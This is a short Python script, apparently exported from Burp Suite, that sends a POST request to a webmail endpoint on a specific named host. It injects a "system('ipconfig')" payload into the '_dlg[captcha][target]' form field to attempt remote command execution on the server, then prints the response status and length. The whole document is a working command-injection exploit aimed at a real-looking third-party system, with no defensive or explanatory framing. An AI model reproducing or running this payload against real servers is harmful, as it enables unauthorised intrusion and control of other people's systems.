import requests

burp0_url = "http://mail2.ramedia.ru:32000/webmail/basic/"
burp0_cookies = {"use_cookies": "1"}
burp0_headers = {"Content-Type": "application/x-www-form-urlencoded"}
burp0_data = {"_dlg[captcha][target]": "system(\\'ipconfig\\')\\\r\n"}
res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
print(res)
print(len(res.text))
# print(res.text)